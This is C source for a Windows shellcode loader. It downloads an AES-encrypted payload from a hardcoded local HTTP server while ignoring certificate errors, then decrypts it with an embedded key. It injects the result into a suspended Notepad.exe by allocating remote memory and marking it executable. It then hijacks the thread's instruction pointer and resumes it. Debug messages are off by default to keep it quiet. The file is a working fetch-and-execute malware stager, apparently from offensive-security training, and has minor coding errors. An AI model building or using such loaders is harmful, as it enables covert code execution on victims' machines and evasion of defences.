#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include <wininet.h>
#include "aes.h"

// import wininet.lib
#pragma comment (lib, "Wininet.lib")
#define PAYLOAD L"http://192.168.13.1:8000/encrypted_shellcode.bin"
#define TARGET_PROCESS "Notepad.exe"
// basic shellcode loader that have the shellcode embedded within the file

// set to 1 for error logs

//#define DEBUG


// payload inside of encrypted_shellcode
// unsigned char encrypted_payload[] = {
//	0xA9, 0x78, 0xC4, 0xBB, 0x6F, 0x5A, 0x8C, 0x54, 0xCE, 0x6D, 0x63, 0x47, 0xFE, 0xBB, 0x3D, 0x04,
//	0x19, 0xE1, 0x99, 0x55, 0x45, 0xF5, 0xE1, 0x96, 0xAD, 0x4C, 0xB8, 0x56, 0x87, 0x36, 0x09, 0xC7,
//	0xD7, 0x3C, 0x3B, 0x52, 0xCC, 0xAD, 0x3C, 0x0F, 0x8D, 0xAA, 0xB8, 0xFB, 0xDA, 0x5D, 0xA3, 0xE9,
//	0xB0, 0x01, 0x99, 0x81, 0xEF, 0x95, 0x86, 0xD9, 0x76, 0xB4, 0xA0, 0x08, 0x2E, 0x47, 0xC0, 0xD6,
//	0xE9, 0x8A, 0x9F, 0x29, 0x07, 0x35, 0x71, 0xBC, 0xA0, 0x5F, 0x9B, 0x69, 0x52, 0x43, 0x40, 0x4D,
//	0x35, 0x5B, 0x41, 0x08, 0x11, 0x47, 0x6D, 0xC7, 0x01, 0xB3, 0xF1, 0xB3, 0xB7, 0x88, 0x0D, 0xC6,
//	0x65, 0x84, 0x0C, 0x1F, 0xD6, 0x93, 0x4C, 0xB4, 0x59, 0x67, 0x8E, 0xBC, 0x67, 0x73, 0xD9, 0xE7,
//	0xBA, 0xD0, 0x55, 0xB2, 0xD4, 0x5D, 0xE0, 0x51, 0x70, 0xBF, 0x7F, 0x8A, 0x42, 0xE0, 0x9A, 0x69,
//	0xC4, 0xF8, 0x98, 0x6A, 0x36, 0xA5, 0x78, 0xDE, 0xD8, 0xD7, 0xCA, 0x63, 0x84, 0xBF, 0xC0, 0x0B,
//	0x6C, 0x5B, 0x44, 0x1B, 0x13, 0x7D, 0x91, 0x19, 0xE4, 0x9B, 0x05, 0xA1, 0xBE, 0xA9, 0xEF, 0x77,
//	0xF9, 0xE4, 0x20, 0x47, 0x18, 0xFD, 0xD4, 0x64, 0x1C, 0x30, 0xAD, 0xFE, 0xE8, 0x85, 0xD1, 0x39,
//	0x6C, 0xBA, 0x54, 0x2E, 0x98, 0x9D, 0x9C, 0xB9, 0xDB, 0x67, 0x49, 0xBD, 0x1E, 0x0F, 0x87, 0x7E,
//	0x66, 0x18, 0x8D, 0x39, 0xBA, 0x65, 0xE2, 0x46, 0x49, 0x73, 0x73, 0xA5, 0xBA, 0x59, 0x1C, 0x99,
//  0xA9, 0x6D, 0x8F, 0x68, 0x80, 0x23, 0x5C, 0x65, 0x92, 0x61, 0xFE, 0x1A, 0xE1, 0xE3, 0xB8, 0x7D,
//  0x53, 0xA0, 0xD2, 0x9B, 0xD7, 0x4F, 0xF3, 0xF1, 0x6F, 0xDB, 0x4B, 0x98, 0x57, 0x6C, 0x68, 0x45,
//  0x65, 0xCA, 0x7A, 0xF4, 0xD3, 0xCC, 0x76, 0x24, 0xFA, 0x60, 0xE0, 0x3D, 0xD7, 0xBD, 0x10, 0x02,
//  0xDC, 0x6D, 0x6D, 0xDB, 0x3D, 0x0F, 0x62, 0xF3, 0x51, 0xD1, 0x71, 0x32, 0x40, 0x01, 0xD7, 0x3C,
//  0x06, 0x1D, 0x58, 0x7B, 0x5B, 0xC3, 0xE4, 0xC0, 0xBF, 0x19, 0xC5, 0xF5, 0xA7, 0xC2, 0x47, 0xED,
//  0x89, 0xA7, 0x55, 0x5C, 0xCC, 0xE7, 0xDA, 0xAC, 0xA0, 0x58, 0x51, 0xB6, 0x07, 0xF8, 0xBB, 0x2F,
//  0x4A, 0x2E, 0x80, 0x11, 0xFE, 0x61, 0x03, 0x4C, 0x3D, 0xAD, 0x73, 0xA2, 0x6A, 0x8B, 0xC9, 0x36,
//  0xF1, 0x18, 0xB4, 0x1C, 0xB0, 0xBA, 0x16, 0x3F, 0x93, 0x0A, 0xD8, 0x64, 0xC2, 0x27, 0x99, 0xC0,
//  0x8D, 0xDC, 0x4E, 0xD9, 0x39, 0xAD, 0x26, 0xF4, 0x67, 0x96, 0x87, 0x48, 0xB9, 0xFA, 0xEE, 0x86,
//  0xC5, 0xB9, 0x96, 0xF6, 0xF2, 0x60, 0x31, 0xDF, 0x4B, 0x35, 0x9D, 0x68, 0xD3, 0x3E, 0x79, 0x4D,
//  0xFB, 0x5F, 0x42, 0xE2, 0x2D, 0x6E, 0xC6, 0xB6, 0xE3, 0xB0, 0x6A, 0x7D, 0xE9, 0x29, 0xDA, 0xD4,
//  0x1C, 0x6F, 0x8D, 0x1D, 0x10, 0x51, 0x01, 0xBC, 0x35, 0x06, 0x5A, 0x89, 0xA8, 0xEC, 0xB6, 0xB9,
//  0xB8, 0x8A, 0x43, 0xA8, 0x68, 0xDF, 0x1F, 0x7C, 0x59, 0xA0, 0x4C, 0x57, 0x42, 0xB8, 0x92, 0x82,
//  0xA6, 0x00, 0x7A, 0xF6, 0x99, 0x80, 0xFF, 0x7E, 0x03, 0x8C, 0x87, 0x50, 0x9B, 0x73, 0x79, 0x32,
//  0x60, 0x7D, 0xA9, 0xBD, 0xBA, 0xDE, 0x5F, 0x54, 0xF3, 0x1B, 0x7C, 0xE2, 0x47, 0x7E, 0x58, 0xDC,
//  0xF2, 0x5C, 0xAE, 0x9E, 0x1C, 0x00, 0x64, 0xFA, 0x02, 0x76, 0x7E, 0x3D, 0x8D, 0x10, 0xD4, 0x35 };


BOOL GetPayload(LPCWSTR srcurl, PBYTE* sPayloadBytes, size_t* sPayloadSize) {


    PBYTE pTmpBytes = NULL;

    PBYTE pBytes = NULL;

    SSIZE_T sSize = 0;

    DWORD dwBytesRead = 0;

    HINTERNET hInternet = NULL;

    HINTERNET hInternetFile = NULL;
    // open an hInternet Handle
    hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);

    hInternetFile = InternetOpenUrlW(hInternet, srcurl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);

    if (hInternetFile == NULL) {
        #ifdef DEBUG
        printf("[!] InternetOpenUrlW failed with code: %d \n", GetLastError());
        #endif
        return FALSE;
    }

    // Allocate a temp 1024 bytes memory region
    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);

    while (TRUE)
    {

        // InternetReadFile will report less read bytes if the final chunk is less than 1024 bytes
        if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
            #ifdef DEBUG
            printf("[!] InternetReadFile failed with error: %d \s", GetLastError());
            #endif
            return FALSE;
        }

        // update the amount of readable bytes to the total size
        sSize += dwBytesRead;

        if (pBytes == NULL) { // if pBytes haven't been allocated yet.
            pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
        } else { // Relloc every time sSize updates
            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
        }

        if (pBytes == NULL) {
            return FALSE;
        }

        // Add the temp buffer to the end of the total buffer
        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);

        memset(pTmpBytes, '\0', dwBytesRead);

        if (dwBytesRead < 1024) {
            break;
        }

    }

        InternetCloseHandle(hInternet);
        InternetCloseHandle(hInternetFile);
        InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);

        *sPayloadBytes = pBytes;
        *sPayloadSize = sSize;

        LocalFree(pTmpBytes);
        #ifdef DEBUG
        printf("[+] Size of payload: %d \n", sSize);
        #endif
        return TRUE;

}



unsigned char AesKey[] = {
	0xFA, 0xD7, 0x41, 0xEE, 0x57, 0x3C, 0xDA, 0x0C, 0x85, 0x5B, 0xCC, 0x8F, 0x33, 0xEF, 0x70, 0xBC,
	0x9F, 0x13, 0x0E, 0x0E, 0x67, 0xBC, 0x4D, 0xDB, 0x9D, 0x87, 0xEE, 0x35, 0x19, 0xB5, 0xBA, 0x0F };


unsigned char AesIv[] = {
	0x42, 0x88, 0x75, 0xDF, 0xC0, 0xB1, 0x54, 0x7C, 0x7C, 0x01, 0x16, 0x58, 0xC2, 0xE3, 0x94, 0xBA };
// for debugging only

VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {

	printf("unsigned char %s[] = {", Name);

	for (int i = 0; i < Size; i++) {
		if (i % 16 == 0) {
			printf("\n\t");
		}
		if (i < Size - 1) {
			printf("0x%0.2X, ", Data[i]);
		}
		else {
			printf("0x%0.2X ", Data[i]);
		}
	}

	printf("};\n\n\n");

}
BOOL DecryptAES(IN PBYTE pCipherTextBuffer, IN SIZE_T sCipherTextSize, IN PBYTE pAesKey, IN PBYTE pAesIv) {

	struct	AES_ctx AesCtx = { 0x00 };

	if (!pCipherTextBuffer || !sCipherTextSize || !pAesKey || !pAesIv)
		return FALSE;

	RtlSecureZeroMemory(&AesCtx, sizeof(AesCtx));
	AES_init_ctx_iv(&AesCtx, pAesKey, pAesIv);
	AES_CBC_decrypt_buffer(&AesCtx, pCipherTextBuffer, sCipherTextSize);

	return TRUE;
}

BOOL CreateSuspendedProcess(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread ) {
    CHAR lpPath [MAX_PATH * 2];
    CHAR WinDirectory [MAX_PATH];

    // STARTUPINFO struct for CreateProcessA: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
    STARTUPINFO Si = { 0 };

    // PROCESS_INFORMATION struct for CreateProcessA: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
    // typedef struct _PROCESS_INFORMATION {
    //  HANDLE hProcess;
    //  HANDLE hThread;
    //  DWORD  dwProcessId;
    //  DWORD  dwThreadId;
    //} PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;

    PROCESS_INFORMATION Pi = { 0 };


    // Wipe the structs to be sure
    RtlSecureZeroMemory( &Si , sizeof(STARTUPINFO));
    RtlSecureZeroMemory(&Pi, sizeof(ProcessorInformation));

    Si.cb = sizeof(STARTUPINFO);

    // Get the name of the %WINDIR% variable to determine the exact location of a file

    if (!GetEnvironmentVariableA("WINDIR", WinDirectory, MAX_PATH)) {
        #ifdef DEBUG
        printf("[!] GetEnviromentVariableA failed with error: %d \n", GetLastError());
        #endif
        return FALSE;
    }
    // Creating the full path for the executable
    sprintf(lpPath, "%s\\System32\\%s", WinDirectory, lpProcessName);
    #ifdef DEBUG
    printf("[i] Running : \"%s\" ... ", lpPath);
    #endif
    if (!CreateProcessA(
        NULL, // not needed
        lpPath, // full path of the executable
        NULL, // not needed
        NULL, // not needed
        FALSE, // set inherit to False
        CREATE_SUSPENDED, // important: set process to start suspended
        NULL, // not needed unless there's something about environment
        NULL, // idk
        &Si, // pointer to the STARTUPINFO struct
        &Pi // Pointer to the PROCESSINFO struct
    )) {

        #ifdef DEBUG
        printf("[!] CreateProcessA failed to create process %s at %s with error: %d\n ", lpProcessName, lpPath, GetLastError());
        #endif
        return FALSE;
    }

    #ifdef DEBUG
    printf("[+] Done\n");
    #endif

    // return PID, Process and thread handle
    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread  = Pi.hThread;

    // Ensure that we got everything we need
    if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
		return TRUE;

    // else return false
    return FALSE;
}

BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* pShellcodeAddress) {
    SIZE_T lpNumberOfBytesWritten = 0;
    DWORD dwOldProtection = 0;

    *pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // allocate memory the size of the shellcode inside of the remote process

    if (*pShellcodeAddress == NULL) {
        #ifdef DEBUG
        printf("[!] VirtualAllocEx failed with error : %d\n", GetLastError());
        #endif
        return FALSE;
    }

    #ifdef DEBUG
    printf("\n[!] pShellcodeAddress allocated at 0x%p of Size %d\n", *pShellcodeAddress, sSizeOfShellcode);
    #endif
    if (!WriteProcessMemory(hProcess, *pShellcodeAddress, pShellcode, sSizeOfShellcode, &lpNumberOfBytesWritten) || lpNumberOfBytesWritten != sSizeOfShellcode) {
        #ifdef DEBUG
        printf("[!] WriteProcessMemory failed with error : %d\n", GetLastError());
        #endif
        return FALSE;
    }

    memset(pShellcode, '\0', sSizeOfShellcode);

    if (!VirtualProtectEx(hProcess, *pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect failed with error : %d\n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

BOOL HijackThreadExecution(HANDLE hThread, IN PVOID pAddress) {
    CONTEXT ThreadContext = {
        .ContextFlags =  CONTEXT_CONTROL
    };

    // Get thread information
    if (!GetThreadContext(hThread, &ThreadContext)) {
        #ifdef DEBUG
        printf("[!] GetThreadContext failed with error: %d\n", GetLastError());
        #endif
        return FALSE;
    }
    // Hijack target address
    ThreadContext.Rip = pAddress;

    // Write thread
    if (!SetThreadContext(hThread, &ThreadContext)) {
        #ifdef DEBUG
        printf("[!] SetThreadContext failed with error: %d\n", GetLastError());
        #endif
        return FALSE;
    }

    return TRUE;
}

int main(int argc, char* argv[]) {
    PBYTE pEncrypted = NULL;
    size_t sSizeOfPayload = 0;
    DWORD flOldProtect = 0;
    DWORD dwProcessId = 0;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    PVOID pShellcodeAddress = NULL;

    // 1: Get encrypted payload

    if (!GetPayload(PAYLOAD, &pEncrypted, &sSizeOfPayload)) {
        #ifdef DEBUG
        printf("[!] Failed to get the payload\n ");
        #endif
        return -1;
    }

    // 2: Decrypt Payload


    if (!DecryptAES(pEncrypted, sSizeOfPayload, AesKey, AesIv)) {
        #ifdef DEBUG
        printf("[!] Failed to decrypt the buffer \n ");
        #endif
        return -1;
    }

    #ifdef DEBUG
    PrintHexData("pEncrypted", pEncrypted, sSizeOfPayload);
    #endif


    // 3: Create suspended process to inject payload to
    if (!CreateSuspendedProcess(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) return -1;

    // 4: Inject payload to suspended process
    if (!InjectShellcodeToRemoteProcess(hProcess, pEncrypted, sSizeOfPayload, &pShellcodeAddress)) return -1;

    // 5: Hijack thread execution to point to shellcode within the process

    if (!HijackThreadExecution(hThread, pShellcodeAddress)) return -1;

    // 6: Resume thread

    ResumeThread(hThread);

    #ifdef DEBUG
    printf("[+] Executing payload with PID: %d\n", dwProcessId);
    #endif


    return 0;
}
